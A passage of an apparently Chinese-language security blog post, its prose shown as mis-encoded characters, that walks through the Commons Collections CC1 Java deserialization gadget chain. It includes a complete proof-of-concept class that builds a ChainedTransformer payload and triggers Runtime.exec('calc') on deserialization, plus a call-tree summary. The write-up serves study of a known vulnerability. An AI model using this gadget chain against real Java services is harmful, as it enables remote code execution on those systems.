<p>é¦–å…ˆè¦æ±‚<code>var7</code>ä¸ä¸ºç©ºã€‚<code>var7</code>çš„æ¥å†æ˜¯<code>var10 = AnnotationType.getInstance(this.type)</code> -&gt; <code>Map var3 = var10.memberTypes()</code> -&gt; <code>Class var7 = (Class)var3.get(var6)</code>ï¼Œè¿™é‡Œé¦–å…ˆä»<code>this.type</code>å±æ€§è·å¾—è¯¥æ³¨è§£ç±»å¯¹åº”çš„ã€å…¨å±€å”¯ä¸€çš„ <code>AnnotationType</code> å®ä¾‹ï¼Œå†ä»è¯¥å®ä¾‹ä¸­è·å–ä¸€ä¸ªMapï¼Œè¯¥Mapå­˜å‚¨äº†æ³¨è§£ä¸­æ¯ä¸ªæˆå‘˜çš„åå­—å’Œè¯¥æˆå‘˜è¢«å®šä¹‰çš„ç±»å‹ï¼Œå†ä»Mapä¸­è·å–é”®ä¸º<code>var6</code>çš„å€¼å¼ºè½¬ä¸ºObjectèµ‹ç»™<code>var7</code>ã€‚è€Œè¦æ±‚<code>var7</code>ä¸ä¸ºç©ºï¼Œå®é™…åˆ™æŒ‡ä¼ å…¥ <code>memberValues</code> çš„é”®åï¼Œå¿…é¡»æ˜¯ç›®æ ‡æ³¨è§£ä¸­å­˜åœ¨çš„æˆå‘˜åç§°</p>
<p>åœ¨<code>Action</code>æ³¨è§£ä¸­ï¼Œæœ‰å¥½å‡ ä¸ªæˆå‘˜</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Action &#123; </span><br><span class="line">    String <span class="title function_">input</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    String <span class="title function_">output</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    FaultAction[] fault() <span class="keyword">default</span> &#123; &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠå…ˆå‰<code>map.put(&quot;key&quot;, &quot;value&quot;)</code>ä¸­çš„<code>key</code>æ”¹ä¸ºä»»æ„ä¸€ä¸ªï¼ˆå¦‚<code>input</code>ï¼‰å³å¯é€šè¿‡æ£€æŸ¥</p>
<p>ç¬¬äºŒå±‚ifåˆ¤æ–­ï¼Œè¦æ±‚<code>var8</code>ä¸æ˜¯<code>var7</code>ç±»å‹å’Œ<code>ExceptionProxy</code>ç±»å‹çš„å®ä¾‹ï¼Œè¿™é‡Œçš„<code>var7</code>ç»è¿‡ä¸Šé¢çš„å¼ºè½¬æ˜¯ä¸€ä¸ªClassç±»å‹ï¼Œ<code>var8</code>ä»<code>Object var8 = var5.getValue()</code>è€Œæ¥ï¼Œå› ä¸ºæˆ‘é€‰æ‹©äº†<code>Action</code>æ³¨è§£çš„<code>input</code>æˆå‘˜ï¼Œæ­¤å¤„æŠŠputè¿‡å»çš„å€¼å˜æˆæ•°å­—å°±èƒ½é€šè¿‡äº†</p>
<p>é€šè¿‡ifåˆ¤æ–­åï¼Œ<code>setValue()</code>è¯­å¥é•¿è¿™æ ·</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var10.members().get(var6)));</span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸è¯´ï¼Œåº”è¯¥è®©<code>setValue()</code>çš„å‚æ•°ä¸º<code>Runtime.getRuntime()</code>ï¼Œè€Œæ­¤å¤„çš„å‚æ•°è¢«å®šä¹‰ä¸ºäº†ä¸€é•¿ä¸²æ— æ³•æ§åˆ¶çš„å‚æ•°</p>
<p>å®é™…ä¸Šï¼Œæ‰§è¡Œ<code>setValue()</code>çš„æ„ä¹‰åœ¨äºæ‰§è¡Œ<code>checkSetValue()</code>ï¼Œæ‰§è¡Œ<code>checkSetValue()</code>çš„æ„ä¹‰åœ¨äºæ‰§è¡Œ<code>transformedMap</code>ä¸­çš„<code>this.valueTransformer.transform()</code>ï¼Œå¯ä»¥å¯»æ‰¾ä¸€ä¸ªç±»ï¼Œè®©å…¶æ‰§è¡Œ<code>transform()</code>ä¸å‚æ•°æ— å…³ï¼Œè€Œæ­£å¥½æœ‰ä¸€ä¸ª<code>ConstantTransformer</code>æ»¡è¶³æ¡ä»¶ï¼Œå®ƒçš„<code>transform()</code>è¢«æ–¹æ³•é‡å†™ä¸º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿”å›å€¼å®Œå…¨ä¸<code>input</code>æ— å…³ï¼Œç›´æ¥è¿”å›äº†å±æ€§<code>iConstant</code>ï¼Œè¯¥å±æ€§åœ¨æ„å»ºæ—¶è¢«èµ‹å€¼</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™ä¸ªç±»åªèƒ½åšåˆ°è¿”å›ï¼Œä¸èƒ½å»æ‰§è¡Œï¼Œè¿˜éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿåè°ƒ<code>ConstantTransformer</code>å’Œ<code>invokerTransformer</code>æ‰§è¡Œ<code>transform()</code>æ–¹æ³•çš„å·¥å…·</p>
<p>åœ¨<code>ChainedTransformer</code>è¿™ä¸ªç±»ä¸­ï¼Œå…¶é‡å†™çš„<code>transform()</code>æ–¹æ³•å¾ˆæœ‰æ„æ€</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>iTransformers</code>æ˜¯ä¸€ä¸ªå­˜å‚¨äº†<code>Transformer</code>å¯¹è±¡çš„æ•°ç»„ï¼Œåœ¨æ„å»ºæ—¶è¢«èµ‹å€¼</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>ChainedTransformer</code>çš„<code>transform()</code>æ–¹æ³•ä»<code>iTransformers</code>æ•°ç»„ä¸­é€ä¸ªéå†å‡º<code>Transformer</code>å¯¹è±¡å¹¶æ‰§è¡Œå®ƒä»¬çš„<code>transform()</code>æ–¹æ³•ï¼Œå¹¶æŠŠä¸Šä¸€ä¸ª<code>transform()</code>æ–¹æ³•æ‰§è¡Œå®Œçš„è¿”å›å€¼å½“ä½œä¸‹ä¸€ä¸ª<code>transform()</code>çš„å‚æ•°</p>
<p>åœ¨æ„å»ºtransformeræ•°ç»„å‰è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œ<code>Runtime</code>æ²¡æœ‰æ¥å…¥<code>Serializable</code>æ¥å£ï¼Œä¸èƒ½è¢«åºåˆ—åŒ–ã€‚æ‰€ä»¥åœ¨æ„å»ºtransformeræ•°ç»„æ—¶æ‰§è¡Œçš„å‘½ä»¤é“¾åº”è¯¥æ˜¯åˆ©ç”¨åå°„å®ä¾‹åŒ–<code>Runtime</code></p>
<p>å¦‚æœ<code>chainedTransformer</code>èƒ½æ„å»ºå‡ºè¿™æ ·çš„<code>iTransformers</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br></pre></td></tr></table></figure>

<p>å°†<code>chainedTransformer</code>ä½œä¸º<code>valueTransformer</code>æ‰§è¡Œ<code>decorate()</code>ï¼Œé‚£ä¹ˆæœ€åæ‰§è¡Œåˆ°<code>setValue()</code>æ—¶ï¼Œæ— è®ºåœ¨<code>setValue()</code>ä¼ å…¥äº†ä»€ä¹ˆï¼Œéƒ½ä¼šè¢«ç¬¬ä¸€æ­¥<code>ConstantTransformer</code>æ‰§è¡Œ<code>transform()</code>å›ºå®šè¿”å›<code>Runtime.class</code>è¦†ç›–ï¼Œä¹‹åå°±æ˜¯å‘½ä»¤é“¾æ¡çš„æ‰§è¡Œ</p>
<p>æœ€åçš„ååºåˆ—åŒ–é“¾ï¼Œæ‰§è¡Œè‡ªåŠ¨è§¦å‘è®¡ç®—å™¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;input&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Action.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser1.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser1.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€»ç»“ä¸€ä¸‹ï¼Œåœ¨é“¾ä¸­ï¼Œä¸€ä¸ª<code>AnnotationInvocationHandler</code>å¯¹è±¡è¢«ååºåˆ—åŒ–ï¼Œè¿™ä¼šè§¦å‘å…¶<code>readObject()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯¹ä¼ å…¥çš„<code>transformedMap</code>è°ƒç”¨äº†<code>setValue()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº†<code>checkSetValue()</code>ï¼Œ<code>checkSetValue()</code>çš„æ‰§è¡Œåˆè°ƒç”¨äº†<code>transformedMap</code>ä¸­çš„<code>this.valueTransformer.transform()</code>ï¼Œå®é™…ä¸Šå°±æ˜¯<code>chainedTransformer.transform()</code>ï¼Œè¯¥æ–¹æ³•ç¬¬ä¸€å±‚æ— è§†äº†å‚æ•°ï¼Œç›´æ¥è¿”å›<code>Runtime.class</code>ï¼Œä¹‹åçš„<code>transform()</code>é€šè¿‡é“¾å¼æ‰§è¡Œé€ æˆäº†æ¶æ„å‘½ä»¤è§¦å‘</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ois.readObject()</span><br><span class="line">â””â”€â”€ AnnotationInvocationHandler.readObject()</span><br><span class="line">    â”œâ”€â”€ this.memberValues.entrySet()</span><br><span class="line">    â”‚   â””â”€â”€ (TransformedMap).entrySet()</span><br><span class="line">    â”‚       â””â”€â”€ AbstractInputCheckedMapDecorator.entrySet()</span><br><span class="line">    â”‚           â”œâ”€â”€ this.isSetValueChecking()</span><br><span class="line">    â”‚           â”‚   â””â”€â”€ (TransformedMap).isSetValueChecking()</span><br><span class="line">    â”‚           â””â”€â”€ new EntrySet(..., this) // åˆ›å»ºEntrySet</span><br><span class="line">    â”‚</span><br><span class="line">    â”œâ”€â”€ EntrySet.iterator()</span><br><span class="line">    â”‚   â””â”€â”€ new EntrySetIterator(..., this.parent) // åˆ›å»ºè¿­ä»£å™¨ï¼Œä¼ é€’parent</span><br><span class="line">    â”‚</span><br><span class="line">    â””â”€â”€ for (Map.Entry var5 : ...) // éå†å¾ªç¯</span><br><span class="line">        â”œâ”€â”€ EntrySetIterator.next()</span><br><span class="line">        â”‚   â””â”€â”€ new MapEntry(entry, this.parent)</span><br><span class="line">        â”‚</span><br><span class="line">        â”œâ”€â”€ ç±»å‹æ£€æŸ¥é€»è¾‘ (var7 != null &amp;&amp; !var7.isInstance(var8))</span><br><span class="line">        â”‚</span><br><span class="line">        â””â”€â”€ MapEntry.setValue(AnnotationTypeMismatchExceptionProxy)</span><br><span class="line">            â””â”€â”€ parent.checkSetValue(value)</span><br><span class="line">                â””â”€â”€ (TransformedMap).checkSetValue()</span><br><span class="line">                    â””â”€â”€ this.valueTransformer.transform(value) // æ‰§è¡Œé¢„è®¾çš„Transformeré“¾</span><br><span class="line">                        â””â”€â”€ ChainedTransformer.transform()</span><br><span class="line">                            â”œâ”€â”€ ConstantTransformer.transform() // Runtime.class</span><br><span class="line">                            â”œâ”€â”€ InvokerTransformer.transform() // getMethod(&quot;getRuntime&quot;)</span><br><span class="line">                            â”œâ”€â”€ InvokerTransformer.transform() // invoke(null) Runtime</span><br><span class="line">                            â””â”€â”€ InvokerTransformer.transform() // exec(&quot;calc&quot;)</span><br><span class="line">                                â””â”€â”€ Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<br/>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/17/Java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6%E5%8F%8ACC1%E9%93%BE%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/" title="Javaä»£ç†æœºåˆ¶åŠCC1é“¾æ‹¾é—è¡¥é˜™"><img class="cover" src="/img/post10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Javaä»£ç†æœºåˆ¶åŠCC1é“¾æ‹¾é—è¡¥é˜™</div></div><div class="info-2"><div class="info-item-1">Javaå¤§äººåˆ«é—¹äº†T_T</div></div></div></a><a class="pagination-related" href="/2025/12/14/Java%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/" title="Javaæ‹¾é—è¡¥é˜™"><img class="cover" src="/img/post8.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Javaæ‹¾é—è¡¥é˜™</div></div><div class="info-2"><div class="info-item-1">ğŸ‘ƒğŸ‘ŠğŸ«ğŸ‘«ğŸ‘ƒğŸ‘ŠğŸ¸ğŸ‘«ğŸ‘ƒğŸ‘ŠğŸ§ğŸ‘ğŸ‘ƒğŸ‘ ğŸ«ğŸ‘«ğŸ‘€ğŸºğŸ«ğŸ‘¬ğŸ‘ƒğŸ‘ŠğŸ«ğŸ‘ğŸ‘ƒğŸ‘ ğŸ«ğŸ‘ğŸ‘ƒğŸ‘ŠğŸ«ğŸ‘ğŸ‘ƒğŸ‘ŠğŸ«ğŸ‘¬ğŸ‘€ğŸºğŸ§ğŸ‘«ğŸ‘€ğŸºğŸ«ğŸ‘ğŸ‘ƒğŸ‘ŠğŸ§ğŸ‘«ğŸ‘ƒğŸ‘ŠğŸ§ğŸ‘«ğŸ‘ƒğŸ‘ŠğŸ§ğŸ‘¬ğŸ‘ƒğŸ‘ ğŸ«ğŸ‘¬ğŸ‘ƒğŸ‘ ğŸ«ğŸ‘¬ğŸ‘ƒğŸ‘ˆğŸ´ğŸ´</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">æ¥½ä¾</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lenonline2021-source"><i class="fab fa-github"></i><span>Github</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%AE%80%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">CommonsCollections1ååºåˆ—åŒ–é“¾ç®€æ</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/16/Agent%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" title="Java AgentåŠå…¶å†…å­˜é©¬å®ç°"><img src="/img/post21.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java AgentåŠå…¶å†…å­˜é©¬å®ç°"/></a><div class="content"><a class="title" href="/2026/01/16/Agent%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" title="Java AgentåŠå…¶å†…å­˜é©¬å®ç°">Java AgentåŠå…¶å†…å­˜é©¬å®ç°</a><time datetime="2026-01-16T14:28:41.000Z" title="Created 2026-01-16 22:28:41">2026-01-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/15/Tomcat%20Valve%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat Valveå†…å­˜é©¬"><img src="/img/post20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat Valveå†…å­˜é©¬"/></a><div class="content"><a class="title" href="/2026/01/15/Tomcat%20Valve%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat Valveå†…å­˜é©¬">Tomcat Valveå†…å­˜é©¬</a><time datetime="2026-01-15T07:03:19.000Z" title="Created 2026-01-15 15:03:19">2026-01-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/15/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/" title="Interceptorå†…å­˜é©¬"><img src="/img/post19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Interceptorå†…å­˜é©¬"/></a><div class="content"><a class="title" href="/2026/01/15/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/" title="Interceptorå†…å­˜é©¬">Interceptorå†…å­˜é©¬</a><time datetime="2026-01-14T17:16:40.000Z" title="Created 2026-01-15 01:16:40">2026-01-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/12/Java%E5%8A%A8%E6%80%81%E7%B1%BB%E7%BC%96%E8%AF%91%E7%AE%80%E6%9E%90/" title="JavaåŠ¨æ€ç±»ç¼–è¯‘ç®€æ"><img src="/img/post18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JavaåŠ¨æ€ç±»ç¼–è¯‘ç®€æ"/></a><div class="content"><a class="title" href="/2026/01/12/Java%E5%8A%A8%E6%80%81%E7%B1%BB%E7%BC%96%E8%AF%91%E7%AE%80%E6%9E%90/" title="JavaåŠ¨æ€ç±»ç¼–è¯‘ç®€æ">JavaåŠ¨æ€ç±»ç¼–è¯‘ç®€æ</a><time datetime="2026-01-12T13:57:42.000Z" title="Created 2026-01-12 21:57:42">2026-01-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/10/Java%E5%90%8E%E7%AB%AFJWT%E9%AA%8C%E8%AF%81%E7%9A%84%E5%AE%9E%E7%8E%B0/" title="Javaåç«¯JWTéªŒè¯çš„å®ç°"><img src="/img/post17.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Javaåç«¯JWTéªŒè¯çš„å®ç°"/></a><div class="content"><a class="title" href="/2026/01/10/Java%E5%90%8E%E7%AB%AFJWT%E9%AA%8C%E8%AF%81%E7%9A%84%E5%AE%9E%E7%8E%B0/" title="Javaåç«¯JWTéªŒè¯çš„å®ç°">Javaåç«¯JWTéªŒè¯çš„å®ç°</a><time datetime="2026-01-10T11:27:52.000Z" title="Created 2026-01-10 19:27:52">2026-01-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-color: #757575;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By æ¥½ä¾</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div><div class="footer_custom_text">ä½ å·²ç»æŠµè¾¾ä¸–ç•Œå°½å¤´å•¦~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script>
  // é¡µé¢åŠ è½½å®Œæˆåéšè—åŠ¨ç”»
  window.addEventListener('load', function() {
    setTimeout(function() {
      const loadingEl = document.getElementById('custom-loading');
      if (loadingEl) {
        loadingEl.style.opacity = '0';
        setTimeout(function() {
          if (loadingEl.parentNode) {
            loadingEl.remove();
          }
        }, 500);
      }
    }, 1000);
  });
</script>
<script async data-pjax src="/"></script></div></body></html>